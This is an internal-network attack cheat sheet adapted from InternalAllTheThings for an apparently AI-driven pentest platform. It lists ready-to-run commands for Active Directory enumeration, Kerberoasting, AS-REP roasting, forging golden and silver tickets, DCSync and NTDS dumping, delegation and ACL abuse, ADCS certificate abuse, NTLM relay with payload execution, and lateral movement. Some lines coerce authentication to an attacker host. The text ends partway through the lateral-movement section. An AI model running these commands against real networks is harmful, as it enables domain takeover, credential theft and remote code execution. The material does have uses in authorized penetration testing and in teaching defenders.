# InternalAllTheThings — ATHENA Internal Network Attack Reference

Source: InternalAllTheThings (MIT License) — github.com/swisskyrepo/InternalAllTheThings

**Purpose:** Comprehensive internal network/AD/cloud attack reference for ATHENA AI Pentest Platform
**Date Compiled:** 2026-02-26
**License:** MIT — cleared for commercial use in ATHENA

---

## TABLE OF CONTENTS

1. [Active Directory Enumeration](#1-active-directory-enumeration)
2. [Kerberoasting](#2-kerberoasting)
3. [AS-REP Roasting](#3-as-rep-roasting)
4. [Kerberos Tickets — Golden & Silver](#4-kerberos-tickets--golden--silver)
5. [DCSync & NTDS Dumping](#5-dcsync--ntds-dumping)
6. [Delegation Abuse](#6-delegation-abuse)
7. [ACL/ACE Abuse](#7-aclace-abuse)
8. [ADCS — Certificate Services ESC1-ESC8](#8-adcs--certificate-services-esc1-esc8)
9. [Shadow Credentials & RBCD](#9-shadow-credentials--rbcd)
10. [NTLM Relay Attacks](#10-ntlm-relay-attacks)
11. [Lateral Movement](#11-lateral-movement)
12. [Pivoting & Tunneling](#12-pivoting--tunneling)
13. [Windows Privilege Escalation](#13-windows-privilege-escalation)
14. [Linux Privilege Escalation](#14-linux-privilege-escalation)
15. [Cloud — AWS](#15-cloud--aws)
16. [Cloud — Azure / Entra ID](#16-cloud--azure--entra-id)
17. [Cloud — GCP](#17-cloud--gcp)
18. [Network Services Attacks](#18-network-services-attacks)
19. [Password Attacks](#19-password-attacks)
20. [Persistence — Windows](#20-persistence--windows)
21. [Persistence — Linux](#21-persistence--linux)

---

## 1. Active Directory Enumeration

### Tools

```powershell
# BloodHound / SharpHound — graph-based AD enumeration
SharpHound.exe -c All --outputdirectory C:\Temp
SharpHound.exe -c All,GPOLocalGroup --zipfilename output.zip

# PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Get-DomainTrust

# NetExec (formerly CrackMapExec)
netexec smb 10.10.10.0/24 -u '' -p ''
netexec smb 10.10.10.10 -u 'user' -p 'pass' --users
netexec smb 10.10.10.10 -u 'user' -p 'pass' --groups
netexec smb 10.10.10.10 -u 'user' -p 'pass' --shares
netexec ldap 10.10.10.10 -u 'user' -p 'pass' --trusted-for-delegation

# ldapdomaindump
ldapdomaindump -u 'DOMAIN\user' -p 'password' ldap://DC_IP

# enum4linux-ng
enum4linux-ng -A 10.10.10.10
```

### Key Enumeration Targets

```powershell
# Domain Info
Get-Domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Users with interesting attributes
Get-DomainUser -SPN                  # Service account users (Kerberoastable)
Get-DomainUser -PreauthNotRequired   # AS-REP roastable users
Get-DomainUser -TrustedToAuth        # Constrained delegation
Get-DomainUser -AllowDelegation      # Unconstrained delegation
Get-DomainUser -AdminCount           # AdminCount=1 users
Get-DomainUser -LDAPFilter "(description=*pass*)"  # Passwords in description

# Computers with delegation
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth

# GPO enumeration
Get-DomainGPO | select displayname, gpcfilesyspath
Get-DomainGPOLocalGroup

# ACL enumeration
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match "Domain Users" }

# AD module
Get-ADUser -Filter * -Properties *
Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter * -Properties *
Get-ADGroupMember "Domain Admins" -Recursive

# impacket
GetADUsers.py -all DOMAIN/user:pass -dc-ip DC_IP
GetADComputers.py DOMAIN/user:pass -dc-ip DC_IP
```

### Common Misconfigurations to Enumerate

- Accounts with `DONT_REQ_PREAUTH` set (AS-REP roastable)
- Accounts with SPNs set (Kerberoastable)
- Computers with unconstrained delegation
- Users/computers with constrained delegation
- `ms-DS-MachineAccountQuota` > 0 (default = 10)
- LDAP signing not enforced
- LDAP channel binding disabled
- SMB signing disabled
- Domain functional level (older = more attack surface)

---

## 2. Kerberoasting

### Theory
Any domain user can request a Service Ticket (ST) for any SPN. The ST is encrypted with the service account's NT hash. This ticket can be cracked offline.

### Requirements
- Valid domain credentials (any user)
- Target service accounts with SPNs

### Attack Commands

```powershell
# impacket — GetUserSPNs.py
GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request
GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request -outputfile hashes.kerberoast

# With NTLM hash (no cleartext)
GetUserSPNs.py -hashes LM:NT DOMAIN/user -dc-ip DC_IP -request

# NetExec
netexec ldap DC_IP -u 'user' -p 'pass' --kerberoasting output.txt --kdcHost DC_IP

# Rubeus
Rubeus.exe kerberoast /outfile:hash.txt
Rubeus.exe kerberoast /creduser:DOMAIN\user /credpassword:MyP@ss /outfile:hash.txt
Rubeus.exe kerberoast /tgtdeleg /outfile:hash.txt   # RC4 downgrade
Rubeus.exe kerberoast /rc4opsec /outfile:hash.txt   # AES RC4 coerce

# PowerView
Request-SPNTicket -SPN "MSSQLSvc/dc01.domain.local:1433"

# Targeted Kerberoasting (write access to servicePrincipalName)
targetedKerberoast.py -d domain.local -u user -p pass --dc-ip DC_IP

# Kerberoasting without pre-auth (September 2022 technique)
netexec ldap DC_IP -u username -p '' --no-preauth-targets users.txt --kerberoasting output.txt
GetUserSPNs.py -no-preauth "NOPREAUTH_USER" -usersfile services.txt DOMAIN/
```

### Cracking

```bash
# hashcat modes
# $krb5tgs$23$ = RC4 = mode 13100
# $krb5tgs$17$ = AES128 = mode 19600
# $krb5tgs$18$ = AES256 = mode 19700

hashcat -m 13100 -a 0 hashes.kerberoast rockyou.txt
hashcat -m 13100 -a 0 hashes.kerberoast rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
hashcat -m 19600 -a 0 hashes.kerberoast rockyou.txt
hashcat -m 19700 -a 0 hashes.kerberoast rockyou.txt

john --format=krb5tgs --wordlist=rockyou.txt hashes.kerberoast
```

### Mitigations
- Service account passwords > 32 characters
- Use Managed Service Accounts (MSAs) or Group Managed Service Accounts (gMSAs)
- Enable AES-only encryption for service accounts
- Monitor Event ID 4769 (Kerberos Service Ticket request) with RC4 (0x17)

---

## 3. AS-REP Roasting

### Theory
If `DONT_REQ_PREAUTH` is set on an account, anyone can request an AS-REP for that user. The response contains data encrypted with the user's hash that can be cracked offline.

### Requirements
- Accounts with `DONT_REQ_PREAUTH` attribute (userAccountControl bit 0x400000)

### Attack Commands

```powershell
# Find vulnerable accounts
Get-DomainUser -PreauthNotRequired | select samaccountname

# bloodyAD
bloodyAD -u user -p 'pass' -d domain.local --host DC_IP get search \
  --filter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' \
  --attr sAMAccountName

# Rubeus
Rubeus.exe asreproast /user:TARGET_USER /format:hashcat /outfile:hashes.asreproast
Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast  # all vulnerable users

# impacket — GetNPUsers.py
GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip DC_IP
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast -dc-ip DC_IP
GetNPUsers.py DOMAIN/user:pass -request -dc-ip DC_IP

# NetExec
netexec ldap DC_IP -u 'user' -p 'pass' --asreproast output.txt --kdcHost DC_IP
```

### Cracking

```bash
# hashcat
# $krb5asrep$23$ = mode 18200
hashcat -m 18200 -a 0 hashes.asreproast rockyou.txt
hashcat -m 18200 -a 0 hashes.asreproast rockyou.txt --rules-file best64.rule

# john
john --format=krb5asrep --wordlist=rockyou.txt hashes.asreproast
```

### CVE-2022-33679 — RC4-MD4 Downgrade
Force KDC to use RC4-MD4 algorithm, then brute-force the session key.

### Mitigations
- Ensure all accounts have Kerberos Pre-Authentication enabled (default)
- Disable RC4 cipher where possible
- Monitor Event ID 4768 with encryption type 0x17 (RC4)

---

## 4. Kerberos Tickets — Golden & Silver

### Golden Ticket

**Requirements:**
| Item | Description |
|------|-------------|
| Domain name | corp.local |
| Domain SID | S-1-5-21-xxx-xxx-xxx |
| KRBTGT NTLM hash | From DCSync or LSASS dump |
| Username | Any (e.g., Administrator) |

```powershell
# Get KRBTGT hash via DCSync
mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt

# Get Domain SID
whoami /user
# or via impacket
impacket-lookupsid DOMAIN/user:pass@DC_IP -domain-sids

# Forge Golden Ticket — Mimikatz
kerberos::purge
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-1234-5678-9012 \
  /krbtgt:d125e4f69c851529045ec95ca80fa37e /ptt

# With AES256 (OPSEC preferred)
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-xxx /aes256:HASH_HERE /ptt

# Rubeus
Rubeus.exe golden /rc4:KRBTGT_HASH /domain:corp.local /sid:DOMAIN_SID \
  /user:Administrator /ptt
Rubeus.exe golden /aes256:KRBTGT_AES_HASH /domain:corp.local /sid:DOMAIN_SID \
  /user:Administrator /ptt /ldap

# impacket — ticketer.py
ticketer.py -nthash KRBTGT_NTLM -domain-sid S-1-5-21-xxx -domain corp.local Administrator
export KRB5CCNAME=./Administrator.ccache
impacket-psexec -k -no-pass DC.corp.local
impacket-wmiexec -k -no-pass DC.corp.local
impacket-secretsdump -k -no-pass DC.corp.local

# Use ticket with impacket
export KRB5CCNAME=/tmp/krb5cc_ticket
impacket-smbclient -k -no-pass DC.corp.local
```

### Silver Ticket

**Requirements:** Service account's NT hash (or computer account hash)

```powershell
# Service types for silver tickets
# HOST    — WMI, PsExec, schtasks
# CIFS    — file share access (dir \\DC\C$)
# HTTP    — PowerShell Remoting, WINRM
# LDAP    — DCSync, LDAP queries
# RPCSS   — WMI remote execution
# MSSQLSvc — SQL Server access

# Mimikatz — Silver Ticket
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-xxx /target:SQL01.corp.local \
  /service:MSSQLSvc /rc4:TARGET_NT_HASH /ptt

# impacket
ticketer.py -nthash TARGET_NT_HASH -domain-sid S-1-5-21-xxx \
  -domain corp.local -spn MSSQLSvc/SQL01.corp.local Administrator
export KRB5CCNAME=./Administrator.ccache

# Access SQL server
impacket-mssqlclient -k -no-pass SQL01.corp.local

# WMI access with silver ticket
wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"

# CIFS access
dir \\DC01\C$
```

### Diamond Tickets (OPSEC-safer alternative)
Modifies a legitimate TGT PAC instead of forging from scratch.
```powershell
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
```

### Detecting Golden/Silver Tickets
- Golden Ticket: 10-year lifetime in Mimikatz default (abnormal)
- Monitor Event ID 4769 without prior 4768
- Silver Ticket: No DC communication for TGT, harder to detect
- Use PAC validation (KB3011780)

---

## 5. DCSync & NTDS Dumping

### DCSync Attack

**Requirements:** Member of Administrators, Domain Admins, Enterprise Admins, or Domain Controller computer accounts. Needs `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights.

```powershell
# Mimikatz — single user
mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
mimikatz# lsadump::dcsync /domain:htb.local /user:Administrator

# Mimikatz — all domain users
mimikatz# lsadump::dcsync /domain:htb.local /all /csv

# impacket — secretsdump
secretsdump.py DOMAIN/user:pass@DC_IP
secretsdump.py -hashes LM:NT DOMAIN/user@DC_IP
secretsdump.py -just-dc DOMAIN/user:pass@DC_IP          # only DC secrets
secretsdump.py -just-dc-user krbtgt DOMAIN/user:pass@DC_IP

# NetExec
netexec smb DC_IP -u user -p pass --ntds
netexec smb DC_IP -u user -p pass --ntds drsuapi

# With hash (pass-the-hash)
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:NT_HASH \
  -just-dc DOMAIN/user@DC_IP
```

### NTDS.dit Extraction

```powershell
# Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy

# ntdsutil
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

# diskshadow
diskshadow /s shadow.txt
# shadow.txt:
# set context persistent nowriters
# add volume c: alias mydrive
# create
# expose %mydrive% x:

# reg save for SYSTEM hive
reg save HKLM\SYSTEM C:\SYSTEM
reg save HKLM\SAM C:\SAM
reg save HKLM\SECURITY C:\SECURITY
```

### Extracting from NTDS.dit

```bash
# impacket — LOCAL extraction
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# ntdissector (newer tool)
ntdissector.py -ntds ntds.dit -system SYSTEM
```

### HiveNightmare / CVE-2021-36934
Allows non-admin users to read SAM, SYSTEM, SECURITY hives on Windows 10/11.

```powershell
# Check if vulnerable
icacls C:\Windows\System32\config\sam
# If BUILTIN\Users:(I)(RX) — vulnerable

# Exploit
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
impacket-secretsdump -sam C:\temp\SAM -system C:\temp\SYSTEM LOCAL
```

### Crack NTLM Hashes

```bash
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Online lookups (for testing only)
# hashmob.net, crackstation.net, hashes.com
```

---

## 6. Delegation Abuse

### Unconstrained Delegation

Machines with unconstrained delegation cache TGTs of any user that authenticates to them.

```powershell
# Find machines with unconstrained delegation
Get-DomainComputer -Unconstrained
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Capture TGTs on the delegated machine
# Wait for Domain Admin to authenticate, then:
mimikatz# sekurlsa::tickets /export
Rubeus.exe triage
Rubeus.exe dump /luid:0x89275d /nowrap

# Coerce DC authentication using SpoolSample or PetitPotam
# On attacker machine, set up monitor:
Rubeus.exe monitor /interval:5 /nowrap

# Trigger DC authentication
SpoolSample.exe DC_IP ATTACKER_IP
PetitPotam.exe ATTACKER_IP DC_IP

# Import captured TGT
Rubeus.exe ptt /ticket:BASE64_TICKET
mimikatz# kerberos::ptt TGT_Administrator.kirbi

# Now DCSync
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Constrained Delegation

Service configured to delegate to specific services. S4U2Self + S4U2Proxy abuse.

```powershell
# Find constrained delegation accounts
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto

# Rubeus — S4U with NTLM hash
Rubeus.exe s4u /user:SRV01$ /rc4:MACHINE_NTLM_HASH \
  /impersonateuser:Administrator \
  /msdsspn:"cifs/DC01.corp.local" /ptt

# Rubeus — with AES key
Rubeus.exe s4u /user:SRV01$ /aes256:AES_HASH \
  /impersonateuser:Administrator \
  /msdsspn:"http/webserver.corp.local" /ptt

# impacket
getST.py -spn "cifs/DC01.corp.local" -impersonate Administrator \
  -dc-ip DC_IP DOMAIN/SRV01$:password
export KRB5CCNAME=./Administrator.ccache
impacket-psexec -k -no-pass DC01.corp.local
```

### Resource-Based Constrained Delegation (RBCD)

If you can write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target, you can impersonate any user to that target.

```powershell
# Requirements:
# - Write access to target computer's msDS-AllowedToActOnBehalfOfOtherIdentity
# - Control a computer account (or create one via MachineAccountQuota)

# Step 1: Create computer account (if MAQ > 0)
impacket-addcomputer -computer-name ATTACKER$ -computer-pass 'Passw0rd!' \
  -dc-ip DC_IP DOMAIN/user:pass
# OR use Powermad
New-MachineAccount -MachineAccount ATTACKER -Password (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)

# Step 2: Set RBCD on target
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;ATTACKER_SID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-ADComputer TARGET | Set-ADComputer -PrincipalsAllowedToDelegateToAccount ATTACKER$

# Via impacket (NTLM relay can do this too)
rbcd.py -f ATTACKER -t TARGET -dc-ip DC_IP DOMAIN/user:pass

# Step 3: S4U2Proxy
getST.py -spn "cifs/TARGET.domain.local" -impersonate Administrator \
  -dc-ip DC_IP DOMAIN/ATTACKER$:Passw0rd!
export KRB5CCNAME=./Administrator.ccache
impacket-smbclient -k -no-pass TARGET.domain.local
```

---

## 7. ACL/ACE Abuse

### Dangerous ACEs

| ACE Right | Attack |
|-----------|--------|
| GenericAll | Full control — reset password, write SPNs, RBCD |
| GenericWrite | Write attributes — set SPN for Kerberoast, RBCD |
| WriteOwner | Change object owner → take GenericAll |
| WriteDACL | Modify DACL → grant yourself GenericAll |
| ForceChangePassword | Reset password without knowing current |
| AllExtendedRights | Includes password reset, read LAPS |
| AddMember | Add users to groups |
| Self | Self-add to groups |

```powershell
# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match "user" }

# BloodHound for visual path finding
# Look for outbound edges: GenericAll, GenericWrite, WriteOwner, WriteDACL

# GenericAll on user — force password change
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# GenericAll on group — add member
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# GenericWrite — write SPN for Kerberoasting
Set-DomainObject -Identity TARGET_USER -Set @{serviceprincipalname='fake/spn'}
# Then Kerberoast, then remove SPN
Set-DomainObject -Identity TARGET_USER -Clear serviceprincipalname

# WriteOwner — take ownership
Set-DomainObjectOwner -Identity TARGET -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity TARGET -PrincipalIdentity attacker -Rights All

# WriteDACL — grant GenericAll to yourself
Add-DomainObjectAcl -TargetIdentity TARGET -PrincipalIdentity attacker -Rights All

# DCSync rights via WriteDACL on domain object
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity attacker \
  -Rights DCSync

# impacket — dacledit
dacledit.py -action 'write' -rights 'FullControl' \
  -principal attacker -target TARGET_USER DOMAIN/user:pass -dc-ip DC_IP
```

---

## 8. ADCS — Certificate Services ESC1-ESC8

### ESC1 — Misconfigured Certificate Templates

**Requirements:** Low-priv user can enroll, template allows Subject Alternative Names (SAN), and template allows client authentication.

```bash
# Enumerate with Certipy
certipy find -u user@domain.local -p pass -dc-ip DC_IP
certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable -stdout

# Enumerate with certutil (Windows)
certutil -TCAInfo
certutil -v -dsTemplate

# ESC1 — Request cert impersonating Domain Admin
certipy req -u user@domain.local -p pass -ca CORP-CA \
  -template VULNERABLE_TEMPLATE \
  -upn administrator@domain.local \
  -dc-ip DC_IP

# Get hash from cert (PKINIT)
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# Rubeus (Windows)
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:certpass /ptt
```

### ESC2 — Any Purpose / SubCA Certificate

```bash
# Request a certificate that can be used as SubCA
certipy req -u user@domain.local -p pass -ca CORP-CA \
  -template ESC2_TEMPLATE -dc-ip DC_IP

# Use the certificate to issue certs for other users
certipy req -u user@domain.local -p pass -ca CORP-CA \
  -template User -on-behalf-of domain\administrator \
  -pfx user.pfx
```

### ESC3 — Certificate Request Agent Template

```bash
# Enroll in agent template first
certipy req -u user@domain.local -p pass -ca CORP-CA \
  -template AGENT_TEMPLATE -dc-ip DC_IP

# Use agent certificate to request on behalf of another user
certipy req -u user@domain.local -p pass -ca CORP-CA \
  -template User -on-behalf-of domain\administrator -pfx agent.pfx
```

### ESC4 — Vulnerable Certificate Template Access Control

```bash
# Write access to template — modify it to be ESC1
certipy template -u user@domain.local -p pass \
  -template VULN_TEMPLATE -save-old -dc-ip DC_IP

# Now exploit as ESC1
certipy req -u user@domain.local -p pass -ca CORP-CA \
  -template VULN_TEMPLATE -upn administrator@domain.local

# Restore template
certipy template -u user@domain.local -p pass \
  -template VULN_TEMPLATE -configuration old_template.json
```

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

```bash
# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set
# ANY template that allows enrollment can specify SAN
certipy req -u user@domain.local -p pass -ca CORP-CA \
  -template User -upn administrator@domain.local
```

### ESC7 — Vulnerable CA Access Control

```bash
# User has ManageCA or ManageCertificates on the CA
# ESC7.1 — Add yourself as officer, then issue failed certs
certipy ca -u user@domain.local -p pass -ca CORP-CA \
  -add-officer user -dc-ip DC_IP
certipy ca -u user@domain.local -p pass -ca CORP-CA \
  -issue-request REQUEST_ID -dc-ip DC_IP
certipy req -u user@domain.local -p pass -ca CORP-CA -retrieve REQUEST_ID
```

### ESC8 — NTLM Relay to ADCS HTTP Endpoint

```bash
# CA web enrollment enabled (HTTP endpoint)
# Relay NTLM authentication to ADCS

# Step 1: Check if web enrollment enabled
certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable

# Step 2: Set up relay
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Step 3: Coerce DC authentication
PetitPotam.py ATTACKER_IP DC_IP
# or SpoolSample, PrinterBug, DFSCoerce

# Step 4: Use the obtained certificate
certipy auth -pfx dc.pfx -dc-ip DC_IP
# → gives NTLM hash of DC machine account
# → can do DCSync with machine account hash
```

### Post-Cert Exploitation

```bash
# Get NTLM hash from certificate via PKINIT
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# Output: administrator:NTLM_HASH

# Pass-the-hash with obtained hash
impacket-wmiexec -hashes :NTLM_HASH administrator@DC_IP

# If PKINIT not available, use LDAP Schannel (UnPAC-the-Hash)
certipy auth -pfx administrator.pfx -ldap-shell -dc-ip DC_IP
```

---

## 9. Shadow Credentials & RBCD

### Shadow Credentials (msDS-KeyCredentialLink)

If you have write access to a user/computer's `msDS-KeyCredentialLink` attribute, you can add a key credential and request a TGT as that account.

```bash
# Enumerate write access to msDS-KeyCredentialLink
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty" }

# Add shadow credential — Certipy
certipy shadow auto -u user@domain.local -p pass \
  -account TARGET_ACCOUNT -dc-ip DC_IP

# Add shadow credential — pywhisker
pywhisker.py -d domain.local -u attacker -p pass \
  --target TARGET_USER --action add

# Add shadow credential — Windows (Whisker)
Whisker.exe add /target:TARGET_USER

# Authenticate with the credential
certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP
# Gives NTLM hash for TARGET_USER
```

### RBCD via NTLM Relay

```bash
# If you can relay to LDAP/LDAPS with a machine account
# Automatically configure RBCD:
ntlmrelayx.py -t ldaps://DC_IP --delegate-access --no-smb-server \
  -wh attacker-wpad
# Then coerce target authentication:
PetitPotam.py ATTACKER_IP TARGET_IP

# Get ST for the target
getST.py -spn "cifs/TARGET.domain.local" \
  -impersonate administrator DOMAIN/ATTACKER$:password
```

---

## 10. NTLM Relay Attacks

### Hash Types Cheatsheet

| Hash | Hashcat Mode | Method |
|------|-------------|--------|
| LM | 3000 | crack/pass-the-hash |
| NTLM/NTHash | 1000 | crack/pass-the-hash |
| NTLMv1/Net-NTLMv1 | 5500 | crack/relay |
| NTLMv2/Net-NTLMv2 | 5600 | crack/relay |

```bash
hashcat -m 5600 -a 0 ntlmv2.txt rockyou.txt
hashcat -m 5500 -a 0 ntlmv1.txt rockyou.txt
```

### LLMNR/NBT-NS Poisoning (Responder)

```bash
# Capture hashes
sudo responder -I eth0 -wfrd -P -v

# NTLMv1 capture (requires Responder.conf edit)
# Set Challenge = 1122334455667788 in Responder.conf
sudo responder -I eth0 --lm --disable-ess

# Inveigh (Windows-based)
Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y
```

### NTLM Relay — SMB to SMB

**Requirement:** SMB signing disabled on target

```bash
# Step 1: Generate relay targets
netexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Step 2: Turn off SMB/HTTP in Responder.conf
# SMB = Off
# HTTP = Off

# Step 3: Run Responder
sudo responder -I eth0 -w -d

# Step 4: Run ntlmrelayx
ntlmrelayx.py -tf relay.txt -smb2support
ntlmrelayx.py -tf relay.txt -smb2support -i       # interactive shell
ntlmrelayx.py -tf relay.txt -smb2support -e shell.exe  # execute payload
ntlmrelayx.py -t smb://TARGET_IP -smb2support -c "whoami > C:\out.txt"
```

### NTLM Relay — SMB to LDAP (Create Computer Account)

**Requirements:** LDAP signing not required, LDAP channel binding disabled, MAQ >= 1

```bash
# Terminal 1: Responder (HTTP/SMB OFF)
sudo responder -I eth0 -wfrd -P -v

# Terminal 2: ntlmrelayx to LDAP
sudo python ntlmrelayx.py -t ldaps://DC_IP --add-computer
```

### NTLM Relay — to ADCS HTTP (ESC8)

```bash
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
```

### NTLM Relay — mitm6 (IPv6 DNS Takeover)

```bash
# Terminal 1: mitm6 — poison IPv6 DNS
mitm6 -hw TARGET_PC -d lab.local --ignore-nofqdn

# Terminal 2: ntlmrelayx
ntlmrelayx.py -ip ATTACKER_IP -t ldaps://dc01.lab.local \
  -wh attacker-wpad --add-computer

# For RBCD:
ntlmrelayx.py -ip ATTACKER_IP -t ldaps://dc01.lab.local \
  -wh attacker-wpad --delegate-access
```

### NTLM Relay — WebDAV Trick (HTTP to LDAP)

```bash
# Coerce HTTP (WebDAV) authentication — bypasses SMB signing requirement
# Enable WebClient service on target
net use * \\webdav-server@8080\share

# Coerce auth via WebDAV:
PetitPotam.py "WIN-MACHINE@80/test.txt" TARGET_IP

# Relay to LDAPS for RBCD
ntlmrelayx.py -t ldaps://DC_IP --delegate-access --no-smb-server
```

### Drop-the-MIC — CVE-2019-1040

```bash
# Remove MIC from NTLM auth packet, relay SMB to LDAP
ntlmrelayx.py -t ldaps://DC_IP --remove-mic \
  --escalate-user 'youruser$' -smb2support --delegate-access
```

### RemotePotato0 — NTLM Relay from Session 0

```bash
# Requires shell in session 0 (WinRM/SSH)
# Terminal 1: ntlmrelayx
ntlmrelayx.py -t ldap://DC_IP --no-wcf-server --escalate-user VICTIM_USER

# Terminal 2: Trigger on target
RemotePotato0.exe -m 2 -r ATTACKER_IP -x ATTACKER_IP -p 9998 -s 1
```

### NTLMv1 Downgrade

```bash
# Force NTLMv1 response via Responder challenge
# In Responder.conf: Challenge = 1122334455667788

# Crack with crack.sh (online) or hashcat -m 5500
hashcat -m 5500 ntlmv1.txt crackstation.txt

# NetNTLMv1 → NT Hash conversion
hashcat -m 27000 ntlmv1.txt nthash-wordlist.txt   # for ESS/SSP variant
hashcat -m 14000 -a 3 inputs.txt --hex-charset \
  -1 /usr/share/hashcat/charsets/DES_full.hcchr ?1?1?1?1?1?1?1?1  # DES KPA
```

---

## 11. Lateral Movement

### PsExec

```bash
# Sysinternal PsExec
PsExec.exe \\TARGET -u DOMAIN\user -p pass cmd.exe
PsExec.exe \\TARGET -accepteula cmd.exe    # with current token

# impacket psexec (creates PSEXECSVC service)
psexec.py DOMAIN/user:pass@TARGET_IP
psexec.py -hashes LM:NT DOMAIN/user@TARGET_IP

# NetExec
netexec smb TARGET_IP -u user -p pass -x "whoami"
netexec smb TARGET_IP -u user -p pass --exec-method smbexec -x "whoami"
```

### WMI

```bash
# wmiexec (impacket) — creates no service, lower footprint
wmiexec.py DOMAIN/user:pass@TARGET_IP
wmiexec.py -hashes LM:NT DOMAIN/user@TARGET_IP
wmiexec.py DOMAIN/user:pass@TARGET_IP "whoami"

# Local Windows WMI
wmic /node:TARGET_IP /user:DOMAIN\user /password:pass process call create "cmd.exe /c whoami > C:\out.txt"

# PowerShell WMI
Invoke-WMIMethod -ComputerName TARGET -Class Win32_Process \
  -Name Create -Argument "cmd.exe /c whoami > C:\out.txt"
```

### WinRM / Evil-WinRM

```bash
# Requirements: port 5985/5986, user in Remote Management Users or Administrators

# evil-winrm
evil-winrm -i TARGET_IP -u user -p pass
evil-winrm -i TARGET_IP -u user -H NT_HASH
evil-winrm -i TARGET_IP -u user -p pass -s /path/to/ps1/scripts/ -e /path/to/exes/

# impacket
atexec.py DOMAIN/user:pass@TARGET_IP whoami

# PowerShell Remoting
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', (ConvertTo-SecureString 'pass' -AsPlainText -Force))
Enter-PSSession -ComputerName TARGET -Credential $cred
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }
```

### DCOM

```bash
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET_IP"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\out.txt","7")

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET_IP"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\out.txt","C:\Windows\System32",$null,0)

# impacket dcomexec
dcomexec.py DOMAIN/user:pass@TARGET_IP whoami
dcomexec.py -hashes LM:NT DOMAIN/user@TARGET_IP whoami
dcomexec.py -object MMC20 DOMAIN/user:pass@TARGET_IP whoami
```

### RDP Hijacking

```bash
# List RDP sessions
qwinsta /server:TARGET

# Hijack session without password (as SYSTEM)
# From elevated cmd:
query user
tscon SESSION_ID /dest:rdp-tcp#0

# With psexec to SYSTEM first
PsExec.exe -s cmd.exe
query user
tscon 2 /dest:rdp-tcp#0
```

### Pass-the-Hash

```bash
# impacket — general PTH
